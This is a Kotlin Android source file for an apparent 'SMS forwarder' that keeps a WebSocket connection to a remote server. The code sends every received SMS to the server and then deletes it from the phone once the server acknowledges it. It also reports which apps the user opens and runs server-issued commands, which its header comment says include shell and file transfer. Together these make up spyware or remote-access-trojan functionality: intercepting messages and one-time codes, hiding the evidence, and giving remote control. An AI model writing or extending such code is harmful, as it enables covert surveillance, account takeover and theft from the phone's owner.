package com.smsforwarder

import android.content.Context
import android.util.Log
import kotlinx.coroutines.CoroutineExceptionHandler
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import org.json.JSONArray
import org.json.JSONObject
import java.net.URI
import java.security.MessageDigest
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.random.Random

/**
 * Transport unique : SMS (voie critique), evenements (voie accessoire) et
 * commandes serveur (shell, transfert de fichiers).
 *
 * Regles anti-boucle :
 *  1. Une seule WebSocketClient vivante : l'ancienne est TOUJOURS fermee.
 *  2. Tout callback d'un client perime est ignore (garde d'identite).
 *  3. Une deconnexion n'est traitee qu'UNE fois par socket.
 *  4. onError ne declenche rien si la socket est encore ouverte.
 *  5. Reconnexion avec backoff exponentiel + jitter, remis a zero apres auth.
 *  6. Battement de coeur applicatif + detection de silence serveur.
 *  7. Chien de garde sur le delai de connexion et sur l'authentification.
 *
 * Evenements : jamais d'ACK unitaire, uniquement un filigrane `upto`.
 *
 * Commandes : le serveur adresse des trames `cmd` ciblees sur ce device ;
 * la reponse revient en `cmd_result` fragmentes. Aucune commande n'est
 * acceptee avant authentification.
 */
class WebSocketManager private constructor(
    private val appContext: Context,
        private val repository: SmsRepository,
            private val pendingQueue: PendingSmsQueue,
                private val deviceIdManager: DeviceIdManager,
                    private val eventOutbox: EventOutbox
) {

    companion object {
        private const val TAG = "WebSocketManager"

        private const val BASE_RETRY_DELAY = 3_000L
        private const val MAX_RETRY_DELAY = 120_000L
        private const val LONG_SESSION_MS = 60_000L

        private const val ACK_TIMEOUT_MS = 30_000L
        private const val CONNECT_TIMEOUT_MS = 20_000L
        private const val AUTH_TIMEOUT_MS = 25_000L
        private const val SILENCE_TIMEOUT_MS = 100_000L
        private const val FLUSH_INTERVAL_MS = 30_000L
        private const val EVENT_FLUSH_INTERVAL_MS = 400L

        @Volatile
        private var instance: WebSocketManager? = null
            private val instanceLock = Any()

            fun getInstance(context: Context): WebSocketManager {
                return instance ?: synchronized(instanceLock) {
                    instance ?: run {
                        val appContext = context.applicationContext
                        WebSocketManager(
                            appContext,
                            SmsRepository(appContext),
                                         PendingSmsQueue(appContext),
                                         DeviceIdManager(appContext),
                                         EventOutbox(appContext)
                        ).also { instance = it }
                    }
                }
            }
    }

    private val exceptionHandler = CoroutineExceptionHandler { _, e ->
        Log.e(TAG, "Exception coroutine non rattrapee", e)
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob() + exceptionHandler)

    /** Envoi brut, sans coroutine : utilise par le routeur de commandes. */
    private val sendRaw: (JSONObject) -> Unit = { payload ->
        try {
            webSocketClient?.takeIf { it.isOpen }?.send(payload.toString())
        } catch (t: Throwable) {
            Log.e(TAG, "Envoi trame impossible", t)
        }
    }

    private val router: CommandRouter by lazy {
        CommandRouter(appContext, sendRaw)
    }

    @Volatile
    private var webSocketClient: WebSocketClient? = null

        @Volatile
        private var isConnected = false

        @Volatile
        private var isAuthenticated = false

        @Volatile
        private var isConnecting = false

        @Volatile
        private var eventsEnabled = false

        @Volatile
        private var lastServerMessageAt = 0L

        private var connectedAt = 0L
        private var reconnectAttempt = 0
        private var manualDisconnect = false

        private var reconnectJob: Job? = null
            private var connectTimeoutJob: Job? = null
                private var authTimeoutJob: Job? = null
                    private var heartbeatJob: Job? = null
                        private var flushJob: Job? = null
                            private var eventFlushJob: Job? = null

                                private val disconnectHandled = AtomicBoolean(false)
                                private val connectionLock = Any()
                                private val pendingAcks = ConcurrentHashMap<String, SmsData>()
                                private val ackTimeoutJobs = ConcurrentHashMap<String, Job>()

                                var onConnectionChange: ((Boolean) -> Unit)? = null
                                var onDebugStatus: ((String) -> Unit)? = null

                                private val deviceId: String by lazy { deviceIdManager.getDeviceId() }

                                // ==================================================================
                                // CONNEXION
                                // ==================================================================

                                fun connect() {
                                    synchronized(connectionLock) {

                                        if (isConnected && webSocketClient?.isOpen == true) return
                                            if (isConnecting) return

                                                reconnectJob?.let { job ->
                                                    reconnectJob = null
                                                    if (job.isActive) job.cancel()
                                                }

                                                manualDisconnect = false
                                                isConnecting = true
                                                disconnectHandled.set(false)

                                                val previous = webSocketClient
                                                webSocketClient = null
                                                safeClose(previous)

                                                try {
                                                    val uri = URI(Config.WEBSOCKET_URL)
                                                    onDebugStatus?.invoke("Connexion vers $uri")

                                                    lateinit var client: WebSocketClient
                                                    client = object : WebSocketClient(uri) {

                                                        override fun onOpen(handshakedata: ServerHandshake?) {
                                                            if (client !== webSocketClient) {
                                                                Log.d(TAG, "onOpen ignore (client perime)")
                                                                return
                                                            }

                                                            Log.d(TAG, "Connecte au serveur")
                                                            onDebugStatus?.invoke("Socket ouverte")

                                                            connectTimeoutJob?.cancel()
                                                            isConnecting = false
                                                            isConnected = true
                                                            isAuthenticated = false
                                                            eventsEnabled = false
                                                            connectedAt = System.currentTimeMillis()
                                                            lastServerMessageAt = System.currentTimeMillis()

                                                            onConnectionChange?.invoke(true)

                                                            val identJson = JSONObject().apply {
                                                                put("type", "identification")
                                                                put("v", Config.CLIENT_PROTOCOL_V)
                                                                put("caps", JSONArray(Config.CLIENT_CAPS.toList()))
                                                                put("deviceId", deviceId)
                                                                put("token", Config.AUTH_TOKEN)
                                                                put("timestamp", System.currentTimeMillis())
                                                            }

                                                            try {
                                                                send(identJson.toString())
                                                                if (Config.DEBUG_PROTOCOL) Log.d(TAG, "-> $identJson")
                                                            } catch (t: Throwable) {
                                                                Log.e(TAG, "Erreur envoi identification", t)
                                                                forceReconnect(client, "envoi-identification")
                                                                    return
                                                            }

                                                            authTimeoutJob?.cancel()
                                                            authTimeoutJob = scope.launch {
                                                                delay(AUTH_TIMEOUT_MS)
                                                                if (client === webSocketClient && !isAuthenticated) {
                                                                    Log.w(TAG, "Pas d'authentification -> reconnexion")
                                                                    forceReconnect(client, "auth-timeout")
                                                                }
                                                            }

                                                            startHeartbeat()
                                                        }

                                                        override fun onMessage(message: String?) {
                                                            if (client !== webSocketClient) return
                                                                lastServerMessageAt = System.currentTimeMillis()
                                                                if (Config.DEBUG_PROTOCOL) Log.d(TAG, "<- $message")
                                                                    handleServerMessage(message)
                                                        }

                                                        override fun onClose(code: Int, reason: String?, remote: Boolean) {
                                                            if (client !== webSocketClient) {
                                                                Log.d(TAG, "onClose ignore (client perime, code=$code)")
                                                                return
                                                            }
                                                            Log.w(TAG, "Deconnecte (code=$code, distant=$remote)")
                                                            onDebugStatus?.invoke("Ferme: code=$code")
                                                            isConnecting = false
                                                            handleDisconnectionOnce()
                                                        }

                                                        override fun onError(ex: Exception?) {
                                                            if (client !== webSocketClient) return
                                                                Log.e(TAG, "Erreur WebSocket: ${ex?.message}", ex)
                                                                onDebugStatus?.invoke("Erreur: ${ex?.javaClass?.simpleName}: ${ex?.message}")
                                                                if (client.isOpen) return
                                                                    isConnecting = false
                                                                    handleDisconnectionOnce()
                                                        }
                                                    }

                                                    client.setConnectionLostTimeout(30)
                                                    webSocketClient = client
                                                    client.connect()

                                                    connectTimeoutJob?.cancel()
                                                    connectTimeoutJob = scope.launch {
                                                        delay(CONNECT_TIMEOUT_MS)
                                                        if (client === webSocketClient && !isConnected) {
                                                            Log.w(TAG, "Timeout de connexion")
                                                            isConnecting = false
                                                            safeClose(client)
                                                            scheduleReconnect()
                                                        }
                                                    }

                                                } catch (t: Throwable) {
                                                    isConnecting = false
                                                    Log.e(TAG, "Erreur a l'ouverture", t)
                                                    onDebugStatus?.invoke("Ouverture impossible: ${t.javaClass.simpleName}")
                                                    handleDisconnectionOnce()
                                                }
                                    }
                                }

                                private fun handleDisconnectionOnce() {
                                    if (!disconnectHandled.compareAndSet(false, true)) return
                                        handleDisconnection()
                                }

                                private fun handleDisconnection() {
                                    val wasConnected = isConnected

                                    isConnecting = false
                                    isConnected = false
                                    isAuthenticated = false
                                    eventsEnabled = false

                                    connectTimeoutJob?.cancel()
                                    authTimeoutJob?.cancel()
                                    heartbeatJob?.cancel()
                                    eventFlushJob?.cancel()

                                    if (wasConnected) onConnectionChange?.invoke(false)

                                        if (connectedAt > 0 && System.currentTimeMillis() - connectedAt > LONG_SESSION_MS) {
                                            reconnectAttempt = 0
                                        }

                                        requeuePendingAcks()

                                        val dead = webSocketClient
                                        webSocketClient = null
                                        safeClose(dead)

                                        scheduleReconnect()
                                }

                                private fun requeuePendingAcks() {
                                    val lost = pendingAcks.values.toList()
                                    ackTimeoutJobs.values.forEach { it.cancel() }
                                    ackTimeoutJobs.clear()
                                    pendingAcks.clear()
                                    lost.forEach { smsData ->
                                        Log.w(TAG, "Connexion perdue, remise en file: ${smsData.id}")
                                        pendingQueue.enqueue(smsData.toQueued())
                                    }
                                }

                                private fun nextBackoffDelay(): Long {
                                    val exp = BASE_RETRY_DELAY * (1L shl reconnectAttempt.coerceAtMost(5))
                                    val capped = exp.coerceAtMost(MAX_RETRY_DELAY)
                                    val jitter = Random.nextLong(0L, capped / 4 + 1L)
                                    return capped + jitter
                                }

                                private fun scheduleReconnect() {
                                    if (manualDisconnect) return
                                        if (reconnectJob?.isActive == true) return

                                            reconnectJob = scope.launch {
                                                val delayMs = nextBackoffDelay()
                                                reconnectAttempt = (reconnectAttempt + 1).coerceAtMost(10)
                                                Log.d(TAG, "Reconnexion dans ${delayMs}ms (tentative $reconnectAttempt)")
                                                delay(delayMs)
                                                reconnectJob = null
                                                connect()
                                            }
                                }

                                private fun forceReconnect(client: WebSocketClient, reason: String) {
                                    if (client !== webSocketClient) return
                                        Log.w(TAG, "Reconnexion forcee ($reason)")
                                        webSocketClient = null
                                        safeClose(client)
                                        handleDisconnectionOnce()
                                }

                                private fun safeClose(client: WebSocketClient?) {
                                    if (client == null) return
                                        try {
                                            client.close(1000, "client-reconnect")
                                        } catch (_: Throwable) {
                                        }
                                        scope.launch {
                                            delay(2_500L)
                                            try {
                                                if (client.isOpen) client.closeConnection(1000, "force")
                                            } catch (_: Throwable) {
                                            }
                                        }
                                }

                                private fun startHeartbeat() {
                                    heartbeatJob?.cancel()
                                    heartbeatJob = scope.launch {
                                        while (isConnected) {
                                            delay(20_000L)
                                            if (!isConnected) break

                                                val silentFor = System.currentTimeMillis() - lastServerMessageAt
                                                if (silentFor > SILENCE_TIMEOUT_MS) {
                                                    Log.w(TAG, "Silence serveur ${silentFor}ms")
                                                    val c = webSocketClient ?: break
                                                    forceReconnect(c, "silence-serveur")
                                                        break
                                                }

                                                try {
                                                    webSocketClient?.send(
                                                        JSONObject().apply {
                                                            put("type", "ping")
                                                            put("timestamp", System.currentTimeMillis())
                                                        }.toString()
                                                    )
                                                } catch (t: Throwable) {
                                                }
                                        }
                                    }
                                }

                                private fun startPeriodicFlush() {
                                    if (flushJob?.isActive == true) return
                                        flushJob = scope.launch {
                                            while (isAuthenticated) {
                                                delay(FLUSH_INTERVAL_MS)
                                                try {
                                                    sendPendingSms()
                                                } catch (t: Throwable) {
                                                    Log.e(TAG, "Erreur flush periodique", t)
                                                }
                                            }
                                        }
                                }

                                fun disconnect() {
                                    manualDisconnect = true
                                    reconnectJob?.cancel()
                                    reconnectJob = null
                                    connectTimeoutJob?.cancel()
                                    authTimeoutJob?.cancel()
                                    heartbeatJob?.cancel()
                                    flushJob?.cancel()
                                    eventFlushJob?.cancel()

                                    requeuePendingAcks()

                                    val c = webSocketClient
                                    webSocketClient = null
                                    safeClose(c)

                                    isConnecting = false
                                    isConnected = false
                                    isAuthenticated = false
                                    eventsEnabled = false

                                    onConnectionChange?.invoke(false)
                                }

                                // ==================================================================
                                // EVENEMENTS
                                // ==================================================================

                                /** Declenche un envoi de lot si la voie evenements est ouverte. */
                                fun flushEvents() {
                                    if (!eventsEnabled || !isAuthenticated) return
                                        if (eventFlushJob?.isActive == true) return

                                            eventFlushJob = scope.launch {
                                                try {
                                                    while (isAuthenticated && eventsEnabled) {
                                                        val batch = eventOutbox.nextBatch(Config.EVENT_MAX_ITEMS, Config.EVENT_MAX_BYTES)
                                                        if (batch.isEmpty()) break
                                                            if (webSocketClient?.isOpen != true) break

                                                                val array = JSONArray()
                                                                batch.forEach { array.put(JSONObject(it)) }

                                                                val payload = JSONObject().apply {
                                                                    put("type", "evt")
                                                                    put("v", Config.CLIENT_PROTOCOL_V)
                                                                    put("deviceId", deviceId)
                                                                    put("events", array)
                                                                }

                                                                try {
                                                                    webSocketClient?.send(payload.toString())
                                                                } catch (t: Throwable) {
                                                                    Log.e(TAG, "Envoi lot impossible", t)
                                                                    break
                                                                }

                                                                delay(EVENT_FLUSH_INTERVAL_MS)
                                                    }
                                                } finally {
                                                    eventFlushJob = null
                                                }
                                            }
                                }

                                private fun startEventFlush() {
                                    eventsEnabled = true
                                    flushEvents()
                                }

                                /**
                                 * Ouverture d'application : signalement immediat, hors outbox.
                                 * Le journal disque local reste tenu par AppObserver.
                                 */
                                fun sendAppOpen(pkg: String, label: String, className: String) {
                                    if (!isAuthenticated || !eventsEnabled) return
                                        if (!RuntimeState.listening) return

                                            val payload = JSONObject().apply {
                                                put("type", "app_open")
                                                put("deviceId", deviceId)
                                                put("package", pkg)
                                                put("label", label)
                                                put("className", className)
                                                put("ts", System.currentTimeMillis())
                                            }

                                            scope.launch {
                                                try {
                                                    webSocketClient?.takeIf { it.isOpen }?.send(payload.toString())
                                                } catch (t: Throwable) {
                                                    Log.e(TAG, "Envoi app_open impossible", t)
                                                }
                                            }
                                }

                                // ==================================================================
                                // SMS
                                // ==================================================================

                                private fun SmsData.toQueued() = PendingSmsQueue.QueuedSms(
                                    id = id,
                                    sender = sender,
                                    body = body,
                                    timestamp = timestamp,
                                    deviceId = deviceId
                                )

                                private fun buildSmsId(sender: String, body: String, timestamp: Long, pdu: ByteArray?): String {
                                    val pduHex = pdu?.joinToString("") { "%02x".format(it.toInt() and 0xff) } ?: ""
                                    val canonical = listOf(deviceId, sender, timestamp.toString(), body, pduHex).joinToString("|")
                                    val digest = MessageDigest.getInstance("SHA-256")
                                    .digest(canonical.toByteArray(Charsets.UTF_8))
                                    return "SMS_${deviceId}_${digest.joinToString("") { "%02x".format(it.toInt() and 0xff) }}"
                                    }

                                    fun sendSms(sender: String, body: String, timestamp: Long, pdu: ByteArray? = null) {
                                        if (!RuntimeState.listening) {
                                            Log.d(TAG, "Ecoute coupee, SMS non transmis")
                                            return
                                        }

                                        val uniqueId = buildSmsId(sender, body, timestamp, pdu)

                                        val smsData = SmsData(
                                            id = uniqueId,
                                            sender = sender,
                                            body = body,
                                            timestamp = timestamp,
                                            deviceId = deviceId
                                        )

                                        if (repository.isAcknowledged(uniqueId)) {
                                            Log.d(TAG, "SMS deja ACK, ignore: $uniqueId")
                                            if (Config.DELETE_SMS_AFTER_ACK) {
                                                deleteSmsFromDeviceWithRetry(sender, body, timestamp)
                                            }
                                            return
                                        }

                                        val queued = smsData.toQueued()
                                        pendingQueue.enqueue(queued)

                                        if (!isConnected || !isAuthenticated || webSocketClient?.isOpen != true) {
                                            Log.d(TAG, "Pas connecte, mise en file: $uniqueId")
                                            connect()
                                            return
                                        }

                                        pendingQueue.markAttempted(queued.id)
                                        scope.launch { sendSmsInternal(smsData) }
                                    }

                                    private suspend fun sendSmsInternal(smsData: SmsData): Boolean {
                                        if (!isConnected || !isAuthenticated || webSocketClient?.isOpen != true) {
                                            pendingQueue.enqueue(smsData.toQueued())
                                            return false
                                        }

                                        val json = JSONObject().apply {
                                            put("type", "sms")
                                            put("id", smsData.id)
                                            put("deviceId", smsData.deviceId)
                                            put("sender", smsData.sender)
                                            put("body", smsData.body)
                                            put("timestamp", smsData.timestamp)
                                        }

                                        return try {
                                            pendingAcks[smsData.id] = smsData
                                            webSocketClient?.send(json.toString())
                                            ackTimeoutJobs[smsData.id] = scope.launch {
                                                delay(ACK_TIMEOUT_MS)
                                                handleAckTimeout(smsData.id)
                                            }
                                            true
                                        } catch (t: Throwable) {
                                            Log.e(TAG, "Erreur envoi: ${smsData.id}", t)
                                            pendingAcks.remove(smsData.id)
                                            ackTimeoutJobs.remove(smsData.id)?.cancel()
                                            val queued = smsData.toQueued()
                                            pendingQueue.enqueue(queued)
                                            pendingQueue.markAttempted(queued.id)
                                            false
                                        }
                                    }

                                    private fun handleAckTimeout(smsId: String) {
                                        ackTimeoutJobs.remove(smsId)
                                        val smsData = pendingAcks.remove(smsId) ?: return
                                        Log.w(TAG, "Timeout ACK, remise en file: $smsId")
                                        val queued = smsData.toQueued()
                                        pendingQueue.enqueue(queued)
                                        pendingQueue.markAttempted(queued.id)
                                    }

                                    private suspend fun sendPendingSms() {
                                        if (!isAuthenticated) return

                                            val pending = pendingQueue.getPending()
                                            if (pending.isEmpty()) return

                                                pending.forEach { queued ->
                                                    if (!isAuthenticated) return@forEach

                                                        val smsData = SmsData(
                                                            id = queued.id,
                                                            sender = queued.sender,
                                                            body = queued.body,
                                                            timestamp = queued.timestamp,
                                                            deviceId = queued.deviceId
                                                        )

                                                        if (!sendSmsInternal(smsData)) {
                                                            Log.w(TAG, "Envoi echoue: ${queued.id}")
                                                        }
                                                        delay(300L)
                                                }
                                    }

                                    // ==================================================================
                                    // COMMANDES SERVEUR
                                    // ==================================================================

                                    private fun handleCommand(json: JSONObject) {
                                        if (!isAuthenticated) {
                                            Log.d(TAG, "cmd recue avant authentification, ignoree")
                                            return
                                        }
                                        scope.launch {
                                            try {
                                                router.handle(json)
                                            } catch (t: Throwable) {
                                                Log.e(TAG, "Erreur execution commande", t)
                                                val id = json.optString("id")
                                                if (id.isNotEmpty()) {
                                                    sendRaw(
                                                        JSONObject().apply {
                                                            put("type", "cmd_result")
                                                            put("id", id)
                                                            put("stream", "stderr")
                                                            put("data", android.util.Base64.encodeToString(
                                                                "interne: ${t.javaClass.simpleName}\n".toByteArray(),
                                                                                                           android.util.Base64.NO_WRAP
                                                            ))
                                                            put("seq", 0)
                                                        }
                                                    )
                                                    sendRaw(
                                                        JSONObject().apply {
                                                            put("type", "cmd_result")
                                                            put("id", id)
                                                            put("stream", "end")
                                                            put("eof", true)
                                                            put("exit", 1)
                                                        }
                                                    )
                                                }
                                            }
                                        }
                                    }

                                    // ==================================================================
                                    // RECEPTION
                                    // ==================================================================

                                    private fun handleServerMessage(message: String?) {
                                        try {
                                            val json = JSONObject(message ?: return)
                                            val msgType = json.optString("type")

                                            when (msgType) {

                                                "authenticated" -> {
                                                    isAuthenticated = true
                                                    authTimeoutJob?.cancel()
                                                    reconnectAttempt = 0

                                                    val caps = json.optJSONArray("caps")
                                                    val supported = caps != null &&
                                                    (0 until caps.length()).any { caps.optString(it) == "evt" }

                                                    Log.d(TAG, "Authentification confirmee (evt=$supported)")
                                                    onDebugStatus?.invoke("Authentifie (evt=$supported)")

                                                    startPeriodicFlush()
                                                    scope.launch { sendPendingSms() }

                                                    if (supported) startEventFlush()
                                                }

                                                "auth_error" -> {
                                                    val raison = json.optString("reason").ifEmpty { json.optString("error") }
                                                    Log.e(TAG, "Authentification refusee: $raison")
                                                    onDebugStatus?.invoke("Auth refusee: $raison")
                                                    isAuthenticated = false
                                                    handleDisconnectionOnce()
                                                }

                                                "upgrade_required" -> {
                                                    val min = json.optInt("min", 2)
                                                    Log.w(TAG, "Mise a jour client requise (min v$min)")
                                                    onDebugStatus?.invoke("Mise a jour requise: v$min")
                                                }

                                                "pong" -> Unit

                                                "ping" -> {
                                                    try {
                                                        webSocketClient?.send(
                                                            JSONObject().apply {
                                                                put("type", "pong")
                                                                put("timestamp", System.currentTimeMillis())
                                                            }.toString()
                                                        )
                                                    } catch (t: Throwable) {
                                                    }
                                                }

                                                "evt_ack" -> {
                                                    val upto = json.optLong("upto", 0L)
                                                    if (upto > 0L) eventOutbox.purge(upto)
                                                        flushEvents()
                                                }

                                                "evt_resend" -> {
                                                    val from = json.optLong("from", 0L)
                                                    val to = json.optLong("to", 0L)
                                                    Log.w(TAG, "Rejeu demande $from..$to")
                                                    // L'outbox conserve tout ce qui n'est pas acquitte :
                                                    // un simple flush renvoie la plage demandee.
                                                    flushEvents()
                                                }

                                                "cmd" -> handleCommand(json)

                                                "ack" -> {
                                                    val smsId = json.optString("smsId")
                                                    if (smsId.isEmpty()) return

                                                        ackTimeoutJobs.remove(smsId)?.cancel()
                                                        val ackedSms = pendingAcks.remove(smsId)
                                                        val queuedSms = if (ackedSms == null) pendingQueue.get(smsId) else null

                                                        repository.markAsAcknowledged(smsId)
                                                        pendingQueue.remove(smsId)

                                                        if (Config.DELETE_SMS_AFTER_ACK) {
                                                            val sender = ackedSms?.sender ?: queuedSms?.sender
                                                            val body = ackedSms?.body ?: queuedSms?.body
                                                            val timestamp = ackedSms?.timestamp ?: queuedSms?.timestamp
                                                            if (sender != null && body != null && timestamp != null) {
                                                                deleteSmsFromDeviceWithRetry(sender, body, timestamp)
                                                            }
                                                        }
                                                }

                                                "error" -> Log.e(TAG, "Erreur serveur: ${json.optString("smsId")}")

                                                else -> Log.d(TAG, "Message serveur ignore: $msgType")
                                            }
                                        } catch (t: Throwable) {
                                            Log.e(TAG, "Erreur parsing message", t)
                                        }
                                    }

                                    private fun deleteSmsFromDeviceWithRetry(sender: String, body: String, timestamp: Long) {
                                        scope.launch {
                                            val maxAttempts = 8
                                            repeat(maxAttempts) { attempt ->
                                                val deleted = repository.deleteSmsFromDevice(sender, body, timestamp)
                                                if (deleted > 0) return@launch
                                                    delay(if (attempt < 3) 2_000L else 5_000L)
                                            }
                                            Log.w(TAG, "SMS introuvable apres $maxAttempts tentatives: $sender")
                                        }
                                    }
                                }
